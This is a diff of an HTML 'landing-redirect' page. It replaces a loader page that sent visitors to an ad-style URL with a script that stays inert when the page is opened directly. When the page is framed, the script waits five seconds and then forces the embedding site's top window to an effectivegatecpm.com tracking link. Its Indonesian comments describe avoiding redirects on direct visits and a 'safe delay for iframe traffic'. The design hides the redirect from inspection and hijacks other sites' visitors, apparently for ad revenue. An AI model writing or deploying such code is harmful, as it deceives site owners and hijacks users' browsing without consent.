@@ -1,65 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
-
-<style>
-body{
-margin:0;
-padding:0;
-background:#000;
-color:#fff;
-font-family:Arial, sans-serif;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-flex-direction:column;
-text-align:center;
-}
-
-.loader{
-border:5px solid #333;
-border-top:5px solid #00c853;
-border-radius:50%;
-width:50px;
-height:50px;
-animation:spin 1s linear infinite;
-margin-bottom:20px;
-}
-
-@keyframes spin{
-0%{transform:rotate(0deg);}
-100%{transform:rotate(360deg);}
-}
-
-.small{
-font-size:14px;
-color:#aaa;
-margin-top:10px;
-}
-</style>
-
+  <meta charset="utf-8">
+  <title>Landing</title>
 </head>
 <body>
 
-<div class="loader"></div>
-
-<div>Please wait...</div>
-<div class="small">Preparing content</div>
+<h1>landing-redirect</h1>
 
 <script>
+(function () {
 
-var url = "https://potentialmaydrench.com/jm8i7er9?key=118c309f728217af88214fc1bc1e64ed";
+  // Jangan redirect kalau dibuka langsung
+  if (window.self === window.top) return;
 
-setTimeout(function(){
+  // Delay aman untuk iframe traffic
+  setTimeout(function () {
+    try {
+      window.top.location.replace("https://www.effectivegatecpm.com/kk8ez1tvr?key=9a5c74a1f25a341b022d34997583d717");
+    } catch (e) {
+      window.location.href = "https://www.effectivegatecpm.com/kk8ez1tvr?key=9a5c74a1f25a341b022d34997583d717";
+    }
+  }, 5000);
 
-window.location.href = url;
-
-}, 4000);
-
+})();
 </script>
 
 </body>
